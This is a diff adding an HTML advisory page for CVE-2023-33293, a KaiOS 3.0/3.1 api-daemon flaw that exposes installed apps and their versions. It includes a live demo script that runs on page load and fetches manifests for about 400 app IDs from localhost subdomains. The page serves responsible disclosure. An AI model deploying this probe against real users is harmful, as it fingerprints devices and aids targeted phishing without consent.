@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>CVE-2023-33293: KaiOS 3.0 App Install Exposure</title>
+    <style type="text/css">
+        body {
+            font-family: PT Sans,sans-serif;
+        }
+
+        p {
+            font-size: 1.1rem;
+            line-height: 1.85;
+        }
+
+        code {
+            font-size: 1rem;
+        }
+
+        button {
+            display: block;
+        }
+
+        button + button {
+            margin-top: 0.5rem;
+        }
+
+        summary {
+            display: block;
+            max-width: 400px;
+            background-color: #f5f5f5;
+            padding: 1rem;
+        }
+
+        code.block {
+            display: block;
+            white-space: pre;
+        }
+    </style>
+  </head>
+  <body>
+    <h1>CVE-2023-33293: Verify Installed App Version on KaiOS 3.0 & 3.1</h1>
+    <summary>
+        <p>
+            Vendor: KaiOS Technologies Inc.<br />
+            Vendor URL: <a href="https://www.kaiostech.com/" rel="external noopener" referrerpolicy="strict-origin-when-cross-origin">https://www.kaiostech.com/</a><br />
+            Versions affected: KaiOS 3.0, KaiOS 3.1<br />
+            Systems Affected: KaiOS-based mobile devices<br />
+            Author: <a href="https://barrasso.me" rel="external noopener" referrerpolicy="strict-origin-when-cross-origin">Tom Barrasso</a><br />
+            CVE Identifier: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33293">CVE-2023-33293</a><br />
+            Risk: Low
+        </p>
+    </summary>
+    <h3>Summary</h3>
+    <p>
+        KaiOS is a mobile operating system based on Firefox OS. The operating system comes with the <a href="https://github.com/kaiostech/api-daemon/" rel="external noopener">api-daemon</a> binary exposing a local web server that responds to HTTP requests on port 80 under the hostname <code>localhost</code>.
+        This server also exposes subdomains for each installed applications, <code>http://myapp.localhost</code>, as well as reserved hostnames <code>cached.localhost</code> for cached Progressive Web Apps (PWAs) and <code>shared.localhost</code> for a bundle of shared system resources. These can be used to fetch assets that are part of the application's bundle.<br />
+    </p>
+    <h3>Location</h3>
+    <ul>
+        <li>Source: <code>/system/kaios/api-daemon</code></li>
+    </ul>
+    <h3>Impact</h3>
+    <p>
+        An attacker can make <code>fetch</code> requests to determine if a given app is installed. Given that KaiOS 3.0 has about ~400 apps available, it's easily feasible to replicate the process to return all installed apps.<br />
+        Exposing whether the user has a given app installed can be used for digital fingerprinting as well as targeted phishing. Additionally, because the manifest is returned in the HTTP response with proper CORS headers, it is also possible to extract additional information such as the app version.
+        <br />
+        <a href="/img/CVE-KaiOS-API-Daemon.jpg" title="Photo of app list with versions exposed on Alcatel Go Flip 4 (KaiOS 3.0) browser">
+            <img src="/img/CVE-KaiOS-API-Daemon.jpg" alt="Photo of app list with versions exposed on Alcatel Go Flip 4 (KaiOS 3.0) browser" height="600" loading="lazy" decoding="async" />
+        </a>
+    </p>
+    <h3>Recommendation</h3>
+    <p>
+        api-daemon should check the <code>Origin</code> header and only return valid responses for the same application, or to <code>shared.localhost</code>. These checks could be further extended to encompass <a href="https://developers.google.com/digital-asset-links/v1/getting-started" rel="external noopener">Digital Asset Links</a> validation used by Android and iOS to allow a website to check if related apps are installed.
+        This approach is more robust but would allow websites, not just apps, to check if their corresponding app is installed.
+    </p>
+    <h2>Demo</h2>
+    <p>This demo lists all installed applications and their installed version. It does not check installed PWAs, but could be adapted to check <code>http://cached.localhost/myapp/</code>.</code></p>
+    <section id="details">
+      <p>
+        <span><b>KaiOS Version</b>:</span>
+        <span id="version"></span>
+      </p>
+      <p>
+        <span><b>App List</b></span><br />
+        <span id="result"></span>
+      </p>
+    </section>
+    <h3>Vendor Communication Timeline</h3>
+    <ul>
+        <li>5/2/23: Tom emailed security@kaiostech.com asking for PGP key used for secure communication.</li>
+        <li>5/5/23: Tom disclosed issues to KaiOS Technologies.</li>
+        <li>5/8/23: KaiOS Technologies acknowledged this issue.</li>
+        <li>5/15/23: Tom asked for the current remediation status.</li>
+    </ul>
+
+	<script type="text/javascript">
+        (function() {
+            let appIds = [
+                "wildgoatsokoban", "greg", "parceltracker", "feedolin", "foodnutrition", "nightclock", "quran", "mathtraining", "runpaceconverter", "podkast", "cricketlive", "mindreader", "massager", "librivoxaudiobooks", "frequencygenerator", "sunsetsunrise", "noobdraw", "jellydropjam", "midiplayer", "cheeseknifethrower", "mochapodcast", "kainews", "pdftools", "surveysays", "periodtracker", "airportcodes", "mocharss", "tankshootingduels", "periodictable", "funnyanimals", "whereami", "yogaposes", "personaldiary", "wordoftheday", "bubbleshooterblitz", "wordscapes", "rssreader", "alcoholtester", "eclipses", "countrycodes", "pyramidofmemories", "soundmeter", "colorblindness", "moonphase", "txtmsgs", "pastlife", "qrreader", "mousecheeseeater", "numerology", "mochaairquality", "palmistry", "docxreader", "spotthedifference", "bodyweightcalculator", "magicball", "suncompass", "moonmonstersjump", "filter", "masquerade", "mobilearena", "mochavnc", "dice", "monsterhelljump", "bowmanbirdshooting", "randomnumber", "virtualcandle", "myipaddress", "nonogram", "blackjack21", "naturesounds", "cartslidepuzzle", "dinovirtualpet", "hodlinfo", "chess", "radiowaves", "beerpipenetwork", "xlsxreader", "eliza", "magnifyingglass", "geoquiz", "truthordare", "8x8checkers", "photozoom", "mocha4inarow", "decisionroulette", "mochaweather", "spinthatwheel", "iching", "minotauraxedefense", "trendingnow", "kaiosstore", "qrtools", "harvestfarmslots", "pixelart", "kaiweather", "guessthesong", "carstreetracing", "todo", "mocharadio", "eastereggbird", "pdfreader", "undermoonshadow", "nesemulator", "christmassantabox", "easymoneyconverter", "questofthewizards", "wordsinwords", "gpsareameasure", "sudokuclassic", "chocolatematch3", "wordle", "easteregghunt", "tankwarsurvival", "eastereggsmatch", "catandmouse", "ninjaknife", "wallbreaker", "matchthefruits", "nametheanimal", "solitaire95", "warstrikeaircrafts", "fireflynightjump", "soldierfieldjump", "gladiatorsurvival", "icecreammatch", "asteroidshooter", "stacktowerjump", "reversi", "picturequiz", "2pics1word", "diamondgirls", "klondikesolitaire3", "wizardadventure", "chickeneggsurvival", "cowboyshowdown", "rebus", "bananamonkeyescape", "sultangemmatch", "pigeonletterbird", "fruitslidepuzzle", "frogroadhop", "sameblox3", "greenpicklerunner", "zombiebridgesniper", "jungletreejump", "rescuethepenguins", "astronautdrilldash", "dogandcatchase", "dodgethespikes", "drillminer", "circlelinerhythm", "chickenblockjumper", "roulette", "bowmanarrowshooter", "mousefarmjump", "snake99", "ballmazeshooter", "nonograms", "spacealieninvasion", "pingponggoal", "jetpacksantaclaus", "caradrenaline", "icecreamcityjump", "penguinicedefender", "dominoes", "cleversnake", "christmasmemories", "pigrunaway", "halloweenmummydig", "dangerousjetpack", "4pics1word", "bombergemadventure", "sokoban", "bowmanquest", "logoquiz", "nightoftheshadows", "hiddenobjects", "bunnyincarrotmaze", "santacatchinggifts", "planeshooter", "timbermantreecut", "glamourslotmachine", "monsterapplefeeder", "frogparkour", "totemtowerstack", "birdfruitdodging", "easterslidepuzzle", "santaintrouble", "mochachess", "santanorthpolerun", "3dballmaze", "pigsummerjump", "birdcopterescape", "matchespuzzle", "gorillabananaquest", "happyalienjump", "crystalcavememory", "galaxyinvaders", "rivercrossing", "christmasfactory", "snake2023", "bigfootpursuit", "robbercityescape", "gems", "carlogos", "wintersnowsurvival", "christmaspuzzles", "ballsort", "bubbleshooterlab", "reversisolitaire", "whackamole", "snakehunter", "hammerthemoles", "queenpharaohslots", "shortcut", "klondike", "goldminerjack", "tankbattle", "bubbleshooterads", "xraysharkshooter", "counthowmany", "fruitsimagequiz", "memorycardsblitz", "jewels", "swordchallenge", "whackadragon", "squirrelfireescape", "guesstheprofession", "carrotbunnyhop", "fruitslotsclassic", "minesweeper95", "gingerbreadrunner", "crazyeggs", "bananacopterswing", "mahjong", "witchswampescape", "impossiblerush", "vikingmonsterrush", "snakeclassic", "battleshipsolitaire", "busychristmasday", "zigguratescape", "christmasconnect", "flappyduck", "bowmanadventure", "verycrazyscientist", "halloweenpuzzles", "crazysanta", "cowboyjetpackride", "connectdots", "2048ce", "catcityjump", "snowmountainskiing", "sharkeatsthefish", "mochagomoku", "easterbunnyfly", "keepthedoctoraway", "foxmountainjumping", "firejumprescue", "dodohunt", "sportsballmatch", "paintbynumber", "mochacheckers", "drawsum", "pyramidescape", "armybasedefense", "wheeloffortune", "pinballflipper", "cupcakeslidepuzzle", "pipeconnect", "koalajumpingcraze", "greentrouble", "5slotswildcasino", "parkingpuzzle", "monsterappleeaters", "videopoker3", "motochaseracing", "chickenrun", "penguinsnowjump", "cryptograms", "slitherlink", "mafiagangsterbrawl", "lavaescape", "pickacheese", "christmaselfrunner", "lasernight", "lumberjacksanta", "slidingblocks", "mutantalienattack", "templeescape", "rabbitjump", "catchthemoney", "duckshooterclassic", "jetpacksurvivor", "fastcarcityracing", "chaseme", "123fruitsmash", "driftrally", "magicalforestslots", "pyramidadventure", "endlessrunner", "halloweenmatch", "threepointer", "ochristmastree", "reindeermatch", "hellstrikeshooter", "autumnseasonmatch", "lightsout", "tropicalquest", "ninjajumperparkour", "itsrainingbombs", "seashellbubblepop", "namethesportquiz", "burgershop", "pinkcarofmayhem", "pizzafoodmaker", "birdy", "icebreaker", "twinslimeshooters", "moneyoftheworld", "spaceshooter", "bingo", "monkeyforestjump", "spacebricks", "astronautinspace", "hungrybirds", "escapefromdeepsea", "wildspaceslots", "crazyfootballjuggle", "donot", "santaclausjump", "hexagonmatch", "knightforestrescue", "namethefoodquiz", "santareindeerfly", "angrychicken", "summerseamatch3", "rabbitspringjump", "blocksandlines", "cavityspacejump", "2048", "bubbleballsorting", "yummyfoodmatch", "cakematchsweetjam", "scaryhalloweenjump", "1010", "spaceshipflight", "deepseaslots", "platformtowerfall", "fishseachase", "christmasslots", "hungrylilly", "jumpnduck", "mazeracing", "airhockey", "santaiceescape", "tictactoe", "mermaidadventure", "spacemansurvival", "basketballhoops", "planet", "easterbunnyslots", "spookyghostjump", "stackbuilding", "jigsaw", "nightcitydash", "battleship", "cavemandinohunter", "heneedstobefed", "savethepirate", "colorlines", "monstermaze", "freecell", "halloweenslots", "reddragonflight", "birdegghatching", "pyramidrunner", "brickbreaker2018", "happybirdjump", "seabattle", "geographyimagequiz", "dungeoncrawler", "memorycards", "endlessmonsterrun", "guardians", "gorillajunglerun", "frogstuckintraffic", "tictactoelite", "girlfashionmatch3", "goldenneondefence", "podlp", "notrealapp", "antitheft", "bluetooth", "calculator", "calendar", "callscreen", "camera", "clock", "communications", "contact", "customization", "download", "email", "emergency-call", "filemanager", "fm", "fota", "ftu", "gallery", "cached", "googlesearch", "kaios-news", "kaios-pay", "kaios-store", "kaios-weather", "keyboard", "launcher", "loginpages", "mmitest", "music", "network-alerts", "notes", "ringtones", "settings", "shared", "sms", "soundrecorder", "stk", "system", "kaios-todo", "video", "wallpaper", "wappush", "youtube", "snake", "kaios-2048", "kaios-gems", "kaios-guardians", "kaios-birdy", "kaios-whackamole"
+            ];
+            // PWA's manifest url example:
+            // http://cached.localhost/google/
+
+            let result = document.getElementById('result');
+            let version = document.getElementById('version');
+
+            // Display version
+            let verFrag = navigator.userAgent.toUpperCase().split('KAIOS')[1];
+            verFrag = (((verFrag || '').split(' ')[0] || '').split('/')[1] || '');
+            version.innerText = verFrag || 'N/A';
+
+            // Check if an app is installed by requesting api-daemon
+            // Load JSON response and extract name & version
+            function checkInstalledApps(ids) {
+                return Promise.all(
+                    ids.map((id) =>
+                            fetch(`http://${id}.localhost/manifest.webmanifest`)
+                                .then((r) => r.json())
+                                .then((r) => ({ id: id, version: (r.b2g_features) ? r.b2g_features.version : undefined, name: r.name }))
+                                .catch((e) => ({ id: id, error: e }))
+                    )
+                );
+            }
+
+            // Display a list of apps on screen
+            function displayApps(apps) {
+                let frag = document.createDocumentFragment();
+                apps.forEach((app) => {
+                    let li = document.createElement('li');
+                    let a = document.createElement('a');
+                    li.addEventListener('click', onAppLinkClick(app));
+                    let span = document.createElement('span');
+                    span.innerText = (app.name || app.id) + ((app.version) ? ' v' + app.version : '');
+                    a.appendChild(span);
+                    li.appendChild(a);
+                    frag.appendChild(li);
+                });
+                result.appendChild(frag);
+            }
+
+            // Check if apps are installed in batches
+            async function checkInstalledAppsInBatches(batchSize = 10) {
+                result.innerHTML = '';
+                for (let i = 0, e = appIds.length; i < e; i += batchSize) {
+                    const chunk = appIds.slice(i, i + batchSize);
+                    await checkInstalledApps(chunk)
+                        .then(displayApps);
+                }
+            }
+
+            requestAnimationFrame(checkInstalledAppsInBatches);
+        })();
+    </script>
+  </body>
+</html>
